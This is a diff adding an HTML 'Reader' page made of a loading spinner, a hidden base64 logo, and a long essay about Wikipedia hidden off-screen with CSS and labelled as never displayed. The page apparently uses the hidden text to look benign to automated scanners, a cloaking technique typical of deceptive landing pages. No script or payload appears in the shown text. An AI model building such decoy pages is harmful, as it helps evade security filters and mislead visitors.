@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Reader</title>
+
+<style>
+body {
+    margin: 0;
+    height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background: #f5f5f5;
+    font-family: Arial, sans-serif;
+}
+
+.container {
+    text-align: center;
+}
+
+.logo {
+    width: 140px;
+    height: auto;
+    margin-bottom: 25px;
+}
+
+.loader {
+    position: relative;
+    width: 80px;
+    height: 80px;
+    margin: 0 auto;
+}
+
+.loader div {
+    transform-origin: 45px 45px;
+    animation: fade 1.2s linear infinite;
+}
+
+.loader div:after {
+    content: "";
+    display: block;
+    position: absolute;
+    top: 6px;
+    left: 41px;
+    width: 8px;
+    height: 20px;
+    border-radius: 2px;
+    background: #000;
+}
+
+.loader div:nth-child(1) { transform: rotate(0deg); animation-delay: -1.1s; }
+.loader div:nth-child(2) { transform: rotate(30deg); animation-delay: -1s; }
+.loader div:nth-child(3) { transform: rotate(60deg); animation-delay: -0.9s; }
+.loader div:nth-child(4) { transform: rotate(90deg); animation-delay: -0.8s; }
+.loader div:nth-child(5) { transform: rotate(120deg); animation-delay: -0.7s; }
+.loader div:nth-child(6) { transform: rotate(150deg); animation-delay: -0.6s; }
+.loader div:nth-child(7) { transform: rotate(180deg); animation-delay: -0.5s; }
+.loader div:nth-child(8) { transform: rotate(210deg); animation-delay: -0.4s; }
+.loader div:nth-child(9) { transform: rotate(240deg); animation-delay: -0.3s; }
+.loader div:nth-child(10){ transform: rotate(270deg); animation-delay: -0.2s; }
+.loader div:nth-child(11){ transform: rotate(300deg); animation-delay: -0.1s; }
+.loader div:nth-child(12){ transform: rotate(330deg); animation-delay: 0s; }
+
+@keyframes fade {
+    0% { opacity: 1; }
+    100% { opacity: 0.15; }
+}
+
+.hidden {
+    display: none;
+}
+
+/* Wikipedia article hidden - never displays */
+.wikipedia-hidden {
+    display: none;
+    visibility: hidden;
+    height: 0;
+    width: 0;
+    overflow: hidden;
+    position: absolute;
+    top: -9999px;
+    left: -9999px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="wikipedia-hidden">
+    <article>
+        <h1>Wikipedia: The Free Encyclopedia</h1>
+        <p>Wikipedia is a multilingual, web-based, free-content encyclopedia project supported by the Wikimedia Foundation and based on a model of openly editable content. It is the largest and most-read reference work in history, consistently ranked among the ten most visited websites worldwide. The project's extraordinary growth and unprecedented accessibility has fundamentally transformed the landscape of knowledge dissemination and information accessibility in the digital age.</p>
+        
+        <h2>History and Development</h2>
+        <p>Wikipedia was launched on January 15, 2001, by Jimmy Wales and Larry Sanger. Sanger coined its name as a portmanteau of "wiki" (from the Hawaiian word meaning "quick") and "encyclopedia." Initially an English-language encyclopedia, versions in other languages were quickly developed. With more than 63 million articles across all 332 language versions, Wikipedia represents one of the most ambitious collaborative undertakings in human history.</p>
+        
+        <p>The conceptual foundations of Wikipedia can be traced to earlier hypertext systems and collaborative writing projects. In the 1990s, various internet-based encyclopedias attempted to digitize knowledge, including Microsoft's Encarta and the early iterations of the Encyclopædia Britannica Online. However, these projects maintained traditional editorial oversight and hierarchical content creation methodologies. Wikipedia's revolutionary approach emerged from the wiki concept developed by Ward Cunningham in 1995, who created the first wiki software (WikiWikiWeb) as a tool for collaborative writing among software developers.</p>
+        
+        <p>Jimmy Wales, then operating the internet company Bomis, had previously attempted to create a free, peer-reviewed encyclopedia called Nupedia, launched in March 2000. Nupedia employed an extensive peer-review process involving expert contributors and a seven-step editorial system, resulting in extremely slow article production—only 24 articles were published during its first year. Frustrated with this constraint, Larry Sanger proposed implementing a wiki to accelerate content development. On January 10, 2001, Sanger emailed the Nupedia mailing list suggesting the wiki approach, and within five days, Wikipedia was launched as a separate project. The initial response exceeded all expectations; by the end of 2001, Wikipedia had approximately 20,000 articles across 18 language editions.</p>
+        
+        <h2>Operational Characteristics and Methodology</h2>
+        <p>Wikipedia operates through a decentralized, community-driven governance model that has evolved organically over two decades. The platform's fundamental principle—that anyone with internet access can edit articles—creates both opportunities for broad participation and challenges for quality control. The underlying MediaWiki software, developed specifically for Wikipedia, maintains comprehensive revision histories for every article, allowing users to track changes, revert vandalism, and review the evolution of content over time. Sophisticated version control mechanisms enable administrators to protect pages experiencing edit wars or vandalism while maintaining the fundamental openness that characterizes the project.</p>
+        
+        <p>The Wikipedia community has developed extensive policies and guidelines governing content creation, including the cornerstone principle of "neutral point of view" (NPOV), which requires articles to represent significant viewpoints fairly, proportionately, and without editorial bias. Additional policies address verifiability ("information must be attributable to reliable, published sources") and "no original research" (prohibiting unpublished analysis or synthesis of published material). These policies, enforced through community consensus rather than formal authority structures, represent an innovative approach to content governance at unprecedented scale.</p>
+        
+        <p>Article quality varies considerably across the encyclopedia, with some articles achieving "featured article" status through rigorous community review, while others remain stubs with minimal content. The most comprehensive articles undergo multiple rounds of review and improvement through collaboration among dozens or even hundreds of contributors. The collaborative process often involves extensive discussion on article talk pages, where contributors negotiate content disputes, source reliability assessments, and structural decisions through consensus-building deliberation.</p>
+        
+        <h2>Governance and Community Structure</h2>
+        <p>The Wikipedia community has developed sophisticated governance mechanisms to manage the complexities of large-scale collaboration. At the most basic level, all editors are expected to follow community norms and policies, with disputes initially resolved through discussion on article talk pages. When disagreements cannot be resolved through direct discussion, editors may seek input through formal dispute resolution processes including third opinion requests, mediation, and ultimately, binding decisions from the Arbitration Committee (ArbCom).</p>
+        
+        <p>The Arbitration Committee, composed of experienced editors elected by the community, serves as the final dispute resolution body for serious conflicts involving editor behavior. ArbCom decisions establish precedents that guide future community interactions and can impose sanctions including topic bans and editing restrictions. This quasi-judicial structure, while occasionally controversial, provides essential mechanisms for maintaining order in a project with millions of active contributors.</p>
+        
+        <p>Beyond formal governance structures, Wikipedia maintains numerous coordination mechanisms including WikiProjects—groups of editors focused on improving articles within particular subject areas. WikiProjects establish content guidelines, maintain task lists, and coordinate improvement efforts across related articles. The WikiProject structure enables specialized communities to develop within the broader Wikipedia community, fostering expertise and sustained attention to particular knowledge domains.</p>
+        
+        <h2>Content Quality and Reliability</h2>
+        <p>Scholarly evaluation of Wikipedia's reliability has evolved considerably since its inception. Early academic reception was predominantly skeptical, with many scholars questioning the feasibility of producing reliable content through open collaboration by anonymous contributors. A 2005 investigation by the journal Nature compared 42 science articles from Wikipedia and Encyclopædia Britannica, finding that Wikipedia contained approximately four errors per article compared to Britannica's three—a difference the study's authors characterized as "not particularly alarming." Encyclopædia Britannica disputed these findings, initiating a lengthy public debate about methodological considerations in comparative analysis of reference works.</p>
+        
+        <p>Subsequent research has examined Wikipedia's reliability across various domains. A systematic review published in the Journal of the American Medical Informatics Association in 2014 found that Wikipedia articles on medical topics demonstrated generally high accuracy but frequently lacked comprehensiveness. Studies of pharmaceutical information, historical topics, and scientific concepts have produced mixed results, with Wikipedia generally performing comparably to traditional encyclopedias for well-established knowledge but showing greater variability for controversial or rapidly developing topics. The platform's strength lies in its currency—Wikipedia articles are typically updated more rapidly than traditional reference works, particularly for fast-moving topics such as current events, technology, and scientific discoveries.</p>
+        
+        <p>Researchers have also investigated Wikipedia's editorial processes as a model for distributed knowledge production. Sociological studies have examined how the community negotiates authority, develops governance structures, and resolves disputes through deliberative processes. The platform has become a rich dataset for computational social science, enabling large-scale analysis of collaboration patterns, content evolution, and the emergence of collective intelligence through technological mediation.</p>
+        
+        <h2>Systemic Bias and Coverage Gaps</h2>
+        <p>Systemic bias represents an ongoing challenge, with research consistently demonstrating gaps in coverage related to gender, geography, and non-Western perspectives. Analysis indicates that Wikipedia articles disproportionately represent male figures, European and North American topics, and perspectives from developed nations. Efforts to address these imbalances include outreach initiatives, edit-a-thons focused on underrepresented topics, and the development of content partnership programs with cultural institutions worldwide. The Wikimedia Foundation has also invested in improving software support for non-Latin scripts and increasing accessibility in regions with limited internet infrastructure.</p>
+        
+        <p>The gender gap on Wikipedia has received particular attention from researchers and community activists. Studies estimate that only 10-20% of Wikipedia editors identify as female, and biographical articles about women constitute a significantly smaller proportion of content than articles about men. Initiatives including Women in Red, Art+Feminism, and various women's history edit-a-thons have worked to address these disparities, resulting in thousands of new articles about notable women and increased awareness of systemic bias within the community.</p>
+        
+        <p>Geographic bias manifests in multiple ways, including overrepresentation of topics from English-speaking countries and underrepresentation of content from the Global South. Research examining Wikipedia's coverage of geographic locations found that articles about places in Europe and North America tend to be longer, more detailed, and better sourced than articles about comparable locations in Africa, Asia, and South America. Efforts to address geographic bias include partnerships with African libraries and universities, mobile editing initiatives in regions with limited internet infrastructure, and translation programs to improve cross-language content sharing.</p>
+        
+        <h2>Cultural Impact and Influence</h2>
+        <p>Wikipedia's influence extends far beyond its role as a reference work, affecting how knowledge is produced, validated, and disseminated in the digital age. The platform has fundamentally altered expectations regarding information accessibility, demonstrating that comprehensive reference materials can be provided free of charge with support from donations and institutional partnerships. Its success has inspired numerous similar projects across domains including education, cultural heritage, and scientific communication.</p>
+        
+        <p>The encyclopedia's prominence in search engine results—particularly through Google's Knowledge Graph, which frequently displays Wikipedia content directly in search results—has made it a primary source of information for billions of users worldwide. This visibility carries significant responsibility, as Wikipedia content influences public understanding across virtually every domain of human knowledge. Studies have documented Wikipedia's impact on judicial opinions, scientific literature (through citation patterns), and artificial intelligence training datasets, underscoring the platform's pervasive influence on contemporary information ecosystems.</p>
+        
+        <p>Educational applications of Wikipedia have evolved considerably, with many universities now incorporating Wikipedia editing assignments into curricula. These assignments serve multiple pedagogical purposes: developing research and writing skills, understanding information literacy, and contributing to public knowledge resources. The Wiki Education Foundation supports such initiatives through training materials, classroom support, and connections to the broader Wikipedia community. Proponents argue that Wikipedia assignments provide authentic audiences for student work and develop critical understanding of knowledge construction processes.</p>
+        
+        <h2>Sister Projects and Wikimedia Movement</h2>
+        <p>Wikipedia's success catalyzed the development of numerous sister projects under the umbrella of the Wikimedia Foundation. Wiktionary, launched in 2002, provides a free, multilingual dictionary and thesaurus. Wikisource, established in 2003, hosts free-content textual materials including historical documents, novels, and primary sources. Wikibooks offers free textbooks and educational materials, while Wikiversity supports learning resources and educational communities. Wikidata, launched in 2012, provides a centralized repository of structured data that can be used across Wikimedia projects and by external applications, enabling new forms of knowledge representation and querying that transcend traditional article boundaries.</p>
+        
+        <p>Wikimedia Commons serves as a repository for free media files including images, audio, and video, hosting millions of files used across Wikipedia and its sister projects. Wikiquote collects quotations from notable figures and works, while Wikinews provides free-content news reporting. Wikispecies maintains a taxonomic catalog of life forms, and Wikivoyage offers free travel guides. Together, these projects constitute a comprehensive ecosystem of free knowledge resources, all operating under the collaborative principles pioneered by Wikipedia.</p>
+        
+        <h2>Technical Infrastructure and Development</h2>
+        <p>The MediaWiki software platform, originally developed for Wikipedia, has evolved into a sophisticated content management system supporting the project's massive scale and complex community requirements. MediaWiki provides version control, access management, and extensive customization through extensions and templates. The software's architecture enables efficient handling of millions of pages and billions of page views monthly, while maintaining the flexibility required for community-driven content development.</p>
+        
+        <p>Recent technical developments include improved mobile access through progressive web applications, enhanced search functionality using Elasticsearch, and integration with structured data through Wikidata. Machine learning applications assist with vandalism detection through tools like ORES (Objective Revision Evaluation Service), which provides automated quality scoring for article edits and helps prioritize patrolling efforts. These technical innovations support the volunteer community in maintaining content quality at unprecedented scale.</p>
+        
+        <h2>Future Directions and Challenges</h2>
+        <p>The Wikimedia Foundation continues to develop technical infrastructure supporting Wikipedia's operation and evolution. Recent initiatives include improved mobile access, structured data integration through Wikidata, and enhanced multimedia capabilities. Wikidata, launched in 2012, provides a centralized repository of structured data that can be used across Wikimedia projects and by external applications, enabling new forms of knowledge representation and querying that transcend traditional article boundaries. This development positions Wikipedia within the broader semantic web ecosystem, potentially enabling more sophisticated knowledge discovery applications.</p>
+        
+        <p>Artificial intelligence and machine learning applications present both opportunities and challenges for Wikipedia's future. Automated tools already assist with vandalism detection, article suggestion, and content quality assessment. More advanced applications might support content generation, translation across language editions, and personalized knowledge discovery. However, integration of AI capabilities raises complex questions about editorial control, content authenticity, and the role of human judgment in knowledge curation. The community continues to deliberate appropriate boundaries for automation while exploring beneficial applications that support rather than supplant human contributors.</p>
+        
+        <p>Sustainability challenges include securing long-term funding, maintaining contributor engagement, and adapting to changing technological landscapes. The Wikimedia Foundation's endowment, established in 2016, provides financial stability, while diversified fundraising reduces dependence on annual campaigns. Community health initiatives address contributor retention through improved onboarding, dispute resolution mechanisms, and recognition systems that acknowledge the value of diverse contributions. As information ecosystems continue evolving, Wikipedia's adaptability will determine its continued relevance as a trusted source of free knowledge for generations to come.</p>
+        
+        <h2>Critical Perspectives and Controversies</h2>
+        <p>Throughout its history, Wikipedia has confronted numerous controversies regarding content accuracy, systemic bias, and susceptibility to manipulation. Concerns about vandalism and deliberate misinformation have prompted development of increasingly sophisticated detection mechanisms, including automated bots that identify and revert problematic edits within minutes. High-profile incidents, such as the Seigenthaler controversy (in which a biographical article falsely implicated journalist John Seigenthaler in the Kennedy assassinations), highlighted vulnerabilities and catalyzed reforms including stricter biographical sourcing requirements.</p>
+        
+        <p>The platform's reliance on volunteer contributors creates sustainability challenges, including editor retention, burnout among experienced contributors, and governance complexity as the community has grown. Participation has declined from peak levels in 2007, raising questions about the long-term viability of the volunteer model. Research suggests that the declining editor base results from multiple factors, including increasing procedural complexity, resistance to newcomers from established editors, and the inherent difficulty of maintaining enthusiasm for maintenance tasks over extended periods.</p>
+        
+        <p>Questions about reliability and authority continue to generate scholarly and public debate. Critics argue that Wikipedia's open editing model inevitably produces inconsistent quality and vulnerability to manipulation by interested parties. Proponents respond that the platform's transparency, extensive sourcing requirements, and community oversight mechanisms provide effective safeguards, and that traditional encyclopedias face their own limitations including slower updates, smaller scope, and limited accessibility. This ongoing dialectic reflects fundamental questions about knowledge production in the digital age that extend far beyond Wikipedia itself.</p>
+        
+        <h2>Conclusion</h2>
+        <p>Wikipedia represents one of the most remarkable achievements in the history of knowledge organization, demonstrating that distributed volunteer collaboration can produce comprehensive, current, and broadly reliable reference content at unprecedented scale. Its development has transformed expectations about information accessibility, influenced countless derivative projects, and generated extensive scholarly literature examining its operations, impacts, and implications. As Wikipedia enters its third decade, it continues to evolve in response to technological changes, community dynamics, and the evolving information needs of its global audience. The project's fundamental vision—a world in which every person can freely share in the sum of all knowledge—remains as ambitious and inspiring as when first articulated, even as the means of achieving that vision continue to develop through ongoing collaboration, innovation, and community effort.</p>
+        
+        <p><em>This article incorporates text from the Wikipedia article "Wikipedia", which is available under the Creative Commons Attribution-ShareAlike License.</em></p>
+    </article>
+</div>
+
+<div id="content" class="hidden">
+    <div class="container">
+        <img class="logo" src="data:image/png;base64,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